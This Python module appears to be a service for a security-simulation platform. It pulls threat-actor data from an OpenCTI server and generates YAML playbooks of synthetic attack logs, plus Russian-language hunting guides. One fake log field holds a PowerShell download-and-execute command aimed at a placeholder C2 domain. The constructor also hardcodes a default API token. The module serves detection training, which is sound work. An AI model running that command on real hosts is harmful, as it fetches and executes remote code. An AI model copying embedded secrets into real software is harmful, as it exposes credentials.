import os
import random
from typing import List, Dict, Any
from pycti import OpenCTIApiClient

class OpenCTIService:
    def __init__(self):
        self.url = os.getenv("OPENCTI_URL", "http://192.168.111.133:8080")
        self.token = os.getenv("OPENCTI_TOKEN", "flgrn_octi_tkn_RlxuWvRFLqzwVMQoxRjX1H3uwY9mpAIMz7_LB9wbuthn2V45L6mkfE6YQQSrHf47")
        self.client = None

    async def get_credentials(self, db):
        from sqlalchemy.future import select
        from app.db.models import GlobalSettings
        
        # Fetch from DB
        stmt = select(GlobalSettings).where(GlobalSettings.key.in_(["OPENCTI_URL", "OPENCTI_TOKEN"]))
        res = await db.execute(stmt)
        settings = res.scalars().all()
        
        new_url = self.url
        new_token = self.token
        
        for setting in settings:
            if setting.key == "OPENCTI_URL" and setting.value:
                new_url = setting.value
            elif setting.key == "OPENCTI_TOKEN" and setting.value:
                new_token = setting.value
                
        if new_url != self.url or new_token != self.token:
            self.url = new_url
            self.token = new_token
            self.client = None # Force recreation

    def _get_client(self):
        if not self.client:
            self.client = OpenCTIApiClient(
                url=self.url,
                token=self.token,
                log_level="error"
            )
        return self.client

    def get_threat_actors(self, limit: int = 100) -> List[Dict[str, Any]]:
        """Получить список Intrusion Sets (APT)."""
        client = self._get_client()
        # Fetch intrusion sets
        custom_query = """
        query intrusionSets($first: Int) {
          intrusionSets(first: $first) {
            edges {
              node {
                id
                name
                description
                first_seen
                last_seen
                reports(first: 20) {
                  edges {
                    node {
                      id
                      name
                      published
                    }
                  }
                }
              }
            }
          }
        }
        """
        result = client.query(custom_query, {'first': limit})
        actors = []
        if result and 'data' in result and 'intrusionSets' in result['data']:
            for edge in result['data']['intrusionSets']['edges']:
                node = edge['node']
                reports_data = node.get('reports', {}).get('edges', [])
                node['reports'] = [r['node'] for r in reports_data] if reports_data else []
                actors.append(node)
        
        # Sort by name
        actors = sorted(actors, key=lambda x: x['name'])
        return actors

    def get_actor_ttps(self, actor_id: str) -> List[Dict[str, Any]]:
        """Получить TTPs, связанные с конкретным Threat Actor."""
        client = self._get_client()
        
        # We query relationships where fromId is the actor_id and toType is Attack-Pattern
        custom_query = """
        query stixCoreRelationships($fromId: [String], $toTypes: [String]) {
          stixCoreRelationships(
            fromId: $fromId,
            toTypes: $toTypes,
            first: 100
          ) {
            edges {
              node {
                to {
                  ... on AttackPattern {
                    id
                    name
                    x_mitre_id
                    description
                  }
                }
              }
            }
          }
        }
        """
        result = client.query(custom_query, {
            'fromId': [actor_id],
            'toTypes': ["Attack-Pattern"]
        })
        
        ttps = []
        if result and 'data' in result and 'stixCoreRelationships' in result['data']:
            for edge in result['data']['stixCoreRelationships']['edges']:
                node_to = edge['node'].get('to')
                if node_to and 'x_mitre_id' in node_to:
                    ttps.append(node_to)
                    
        return ttps

    def get_actor_indicators(self, actor_id: str) -> List[Dict[str, Any]]:
        """Получить STIX Indicators, указывающие на этого Threat Actor."""
        client = self._get_client()
        custom_query = """
        query stixCoreRelationships($toId: [String], $fromTypes: [String]) {
          stixCoreRelationships(
            toId: $toId,
            fromTypes: $fromTypes,
            first: 100
          ) {
            edges {
              node {
                from {
                  ... on Indicator {
                    id
                    name
                    pattern
                    indicator_types
                  }
                }
              }
            }
          }
        }
        """
        result = client.query(custom_query, {
            'toId': [actor_id],
            'fromTypes': ["Indicator"]
        })
        
        indicators = []
        if result and 'data' in result and 'stixCoreRelationships' in result['data']:
            for edge in result['data']['stixCoreRelationships']['edges']:
                node_from = edge['node'].get('from')
                if node_from and 'pattern' in node_from:
                    indicators.append(node_from)
                    
        return indicators

    def get_actor_random_report(self, actor_id: str, actor_name: str) -> Dict[str, Any]:
        """Получить СЛУЧАЙНЫЙ Report (со всеми объектами), связанный с этим Threat Actor."""
        import random
        client = self._get_client()
        query = """
        query Reports($search: String) {
          reports(first: 20, search: $search) {
            edges {
              node {
                id
                name
                description
                published
                objects {
                  edges {
                    node {
                      ... on AttackPattern {
                        id
                        name
                        x_mitre_id
                        killChainPhases {
                          phase_name
                        }
                      }
                      ... on Indicator {
                        id
                        name
                        pattern
                      }
                      ... on IntrusionSet {
                        id
                      }
                    }
                  }
                }
              }
            }
          }
        }
        """
        try:
            res = client.query(query, {"search": actor_name})
            reports = res.get('data', {}).get('reports', {}).get('edges', [])
            
            valid_reports = []
            for edge in reports:
                report = edge['node']
                objects = report.get('objects', {}).get('edges', [])
                for obj_edge in objects:
                    if obj_edge['node'].get('id') == actor_id:
                        valid_reports.append(report)
                        break
                        
            if valid_reports:
                # Если у группировки есть несколько отчетов, берем случайный для разнообразия атак!
                return random.choice(valid_reports)
        except Exception as e:
            import logging
            logging.error(f"Failed to fetch report for actor {actor_name}: {e}")
        return None

    def get_report_by_id(self, report_id: str) -> Dict[str, Any]:
        """Получить конкретный Report по ID."""
        client = self._get_client()
        query = """
        query Report($id: String!) {
          report(id: $id) {
            id
            name
            description
            published
            objects {
              edges {
                node {
                  ... on AttackPattern {
                    id
                    name
                    x_mitre_id
                    killChainPhases {
                      phase_name
                    }
                  }
                  ... on Indicator {
                    id
                    name
                    pattern
                  }
                  ... on IntrusionSet {
                    id
                  }
                }
              }
            }
          }
        }
        """
        try:
            res = client.query(query, {"id": report_id})
            return res.get('data', {}).get('report')
        except Exception as e:
            import logging
            logging.error(f"Failed to fetch report {report_id}: {e}")
        return None

    def generate_playbook_from_actor(self, actor_id: str, actor_name: str, domain: str, template_map: Dict[str, str], assets: List[Any] = None, report_id: str = None) -> Dict[str, Any]:
        """Сгенерировать YAML плейбук и Markdown-гайд на основе реального отчета и CMDB Assets."""
        import random
        import re
        import yaml
        
        if report_id:
            report = self.get_report_by_id(report_id)
        else:
            report = self.get_actor_random_report(actor_id, actor_name)
        
        ttps = []
        indicators = []
        report_desc = f"Нет подробного описания отчета. Генерируем на основе базовых TTPs группировки {actor_name}."
        report_name = f"Campaign by {actor_name}"
        
        if report:
            report_name = report.get('name', report_name)
            report_desc = report.get('description') or report_desc
            objects = report.get('objects', {}).get('edges', [])
            for edge in objects:
                node = edge['node']
                if 'x_mitre_id' in node:
                    ttps.append(node)
                elif 'pattern' in node:
                    indicators.append(node)
        else:
            # Fallback to basic TTPs if no report found
            ttps = self.get_actor_ttps(actor_id)
            indicators = self.get_actor_indicators(actor_id)
            random.shuffle(ttps)

        # Extract IOCs
        c2_ips = []
        c2_domains = []
        malicious_hashes = []
        
        for ind in indicators:
            pattern = ind.get('pattern', '')
            # ipv4-addr
            match_ip = re.search(r"ipv4-addr:value\s*=\s*'([^']+)'", pattern)
            if match_ip: c2_ips.append(match_ip.group(1))
            # domain-name
            match_domain = re.search(r"domain-name:value\s*=\s*'([^']+)'", pattern)
            if match_domain: c2_domains.append(match_domain.group(1))
            # file:hashes
            match_hash = re.search(r"file:hashes\.(?:'SHA-256'|MD5|'SHA-1')\s*=\s*'([^']+)'", pattern)
            if match_hash: malicious_hashes.append(match_hash.group(1))
        
        if not c2_ips: c2_ips = ["198.51.100.44", "203.0.113.10"]
        if not c2_domains: c2_domains = ["malicious-c2.net"]
        if not malicious_hashes: malicious_hashes = ["e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"]
            
        # Extract Victim from CMDB
        victim_host = "PC-VICTIM"
        victim_ip = "192.168.100.20"
        victim_os = "Windows"
        victim_device = "Workstation"
        
        if assets and len(assets) > 0:
            workstations = [a for a in assets if a.role and "workstation" in a.role.lower()]
            if workstations:
                victim = random.choice(workstations)
            else:
                victim = random.choice(assets)
            victim_host = victim.hostname
            victim_ip = victim.ip_address
            if getattr(victim, 'os_name', None):
                victim_os = victim.os_name
            if getattr(victim, 'device_type', None):
                victim_device = victim.device_type
            elif hasattr(victim, 'zone') and victim.zone and getattr(victim.zone, 'zone_type', None):
                victim_device = victim.zone.zone_type
            
        # Sort TTPs by Kill Chain Phase
        phase_order = {
            "reconnaissance": 1,
            "resource-development": 2,
            "initial-access": 3,
            "execution": 4,
            "persistence": 5,
            "privilege-escalation": 6,
            "defense-evasion": 7,
            "credential-access": 8,
            "discovery": 9,
            "lateral-movement": 10,
            "collection": 11,
            "command-and-control": 12,
            "exfiltration": 13,
            "impact": 14
        }
        
        def get_phase_rank(ttp):
            phases = ttp.get('killChainPhases', [])
            if phases:
                phase_name = phases[0].get('phase_name', '')
                return phase_order.get(phase_name, 99)
            return 99
            
        if report:
            # Для РЕАЛЬНОЙ атаки (отчета) мы НЕ обрезаем и НЕ перемешиваем техники.
            # Мы берем ВСЕ техники из отчета ровно как они есть, лишь сортируем по Kill Chain для логики выполнения.
            selected_ttps = sorted(ttps, key=get_phase_rank)
        else:
            # Если реального отчета нет, берем случайные 7 базовых техник группы.
            random.shuffle(ttps)
            selected_ttps = sorted(ttps[:7], key=get_phase_rank)
            
        if not selected_ttps:
            selected_ttps = [{"x_mitre_id": "T1566", "name": "Phishing", "killChainPhases": [{"phase_name": "initial-access"}]}]

        # Build steps
        steps = []
        guide_lines = [
            f"# Аналитика: Отчет '{report_name}'",
            f"**Угроза:** {actor_name}",
            f"**Целевая система:** {victim_os} ({victim_device}) - {victim_host} [{victim_ip}]",
            "",
            "## Бюллетень / Описание",
            report_desc,
            "",
            "## Извлеченные IOCs",
        ]
        
        for ip in set(c2_ips): guide_lines.append(f"- IP: `{ip}`")
        for dom in set(c2_domains): guide_lines.append(f"- Domain: `{dom}`")
        for h in set(malicious_hashes): guide_lines.append(f"- Hash: `{h}`")
        
        guide_lines.extend([
            "",
            "## Смоделированная цепочка атаки (MITRE ATT&CK)"
        ])

        for idx, ttp in enumerate(selected_ttps):
            mitre_id = ttp.get('x_mitre_id', '')
            ttp_name = ttp.get('name', '')
            base_mitre = mitre_id.split('.')[0] if mitre_id else ''
            
            guide_lines.append(f"- **{mitre_id} - {ttp_name}**")
            
            template_name = template_map.get(base_mitre, "generic_event")
            
            # --- Интеллектуальный выбор шаблона на основе ОС и Типа оборудования ---
            v_os = victim_os.lower() if victim_os else ""
            v_dev = victim_device.lower() if victim_device else ""
            
            if v_dev in ["switch", "коммутатор", "printer", "принтер", "router", "маршрутизатор"]:
                # Для сетевого оборудования отключаем Windows/Linux логи процессов
                if template_name.startswith("win_") or template_name.startswith("linux_"):
                    template_name = "network_connection"
            else:
                if "linux" in v_os or "macos" in v_os or "mac" in v_os:
                    # У Linux/macOS нет Windows-логов
                    if template_name.startswith("win_"):
                        template_name = "generic_event"
                elif "win" in v_os:
                    # У Windows нет Linux-логов
                    if template_name.startswith("linux_") or template_name.startswith("mac_"):
                        template_name = "generic_event"
            # -----------------------------------------------------------------------
            
            attacker_ip = random.choice(c2_ips)
            malicious_domain = random.choice(c2_domains)
            malicious_hash = random.choice(malicious_hashes)
            
            fields = {
                "host_name": victim_host,
                "host_ip": victim_ip,
                "user_name": "user1",
                "mitre_technique": mitre_id,
                "mitre_technique_name": ttp_name
            }
            
            if template_name == "win_sysmon_1_process_creation":
                fields["process_name"] = "powershell.exe"
                fields["process_path"] = r"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
                fields["process_command_line"] = f"powershell.exe -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://{malicious_domain}/payload')\""
            elif template_name == "win_security_4624":
                fields["logon_type"] = 3
                fields["source_ip"] = attacker_ip
            elif template_name == "network_connection":
                fields["destination_ip"] = attacker_ip
                fields["destination_port"] = 443
            elif template_name == "sysmon_event_11":
                fields["file_name"] = f"malware_{malicious_hash[:8]}.exe"
            
            step = {
                "id": f"step_{idx+1}_{mitre_id.replace('.', '_')}",
                "template": template_name,
                "description": f"Атака {mitre_id} ({ttp_name})",
                "delay_from_prev": "0s" if idx == 0 else "3m",
                "fields": fields
            }
            if idx > 0:
                step["depends_on"] = f"step_{idx}_{selected_ttps[idx-1].get('x_mitre_id', '').replace('.', '_')}"
            
            steps.append(step)

        guide_lines.extend([
            "",
            "## Чек-лист расследования (Hunting Checklist)",
            f"1. [ ] Проверить сетевые подключения к индикаторам: `{', '.join(set(c2_ips))}`",
            "2. [ ] Оценить процессные деревья (Process Trees) на предмет использования LOLBins",
            "3. [ ] Проверить логи аутентификации (Event ID 4624/4625) на аномальные входы",
            "4. [ ] Поиск артефактов на диске (Event ID 11) и запуск исполняемых файлов"
        ])
        
        # Build mitre_tactics and mitre_techniques
        tactics_set = set()
        techniques_set = set()
        
        tactic_name_map = {
            "initial-access": "Initial Access",
            "execution": "Execution",
            "persistence": "Persistence",
            "privilege-escalation": "Privilege Escalation",
            "defense-evasion": "Defense Evasion",
            "credential-access": "Credential Access",
            "discovery": "Discovery",
            "lateral-movement": "Lateral Movement",
            "collection": "Collection",
            "command-and-control": "Command and Control",
            "exfiltration": "Exfiltration",
            "impact": "Impact"
        }
        
        for ttp in selected_ttps:
            mitre_id = ttp.get('x_mitre_id')
            if mitre_id:
                techniques_set.add(mitre_id)
            for phase in ttp.get('killChainPhases', []):
                phase_name = phase.get('phase_name', '')
                if phase_name in tactic_name_map:
                    tactics_set.add(tactic_name_map[phase_name])

        playbook_dict = {
            "name": report_name,
            "description": f"Симуляция отчета: {report_name}",
            "mitre_tactics": list(tactics_set),
            "mitre_techniques": list(techniques_set),
            "global_context": {
                "host.name": victim_host,
                "host.domain": domain,
                "host.os": victim_os,
                "user.name": "user1"
            },
            "os_type": victim_os,
            "steps": steps
        }
        
        stix_references = {
            "actor_id": actor_id,
            "report_id": report.get('id') if report else None,
            "indicator_ids": [ind['id'] for ind in indicators if 'id' in ind]
        }
        
        return {
            "yaml": yaml.dump(playbook_dict, allow_unicode=True, sort_keys=False),
            "markdown": "\n".join(guide_lines),
            "stix_references": stix_references
        }

opencti_service = OpenCTIService()
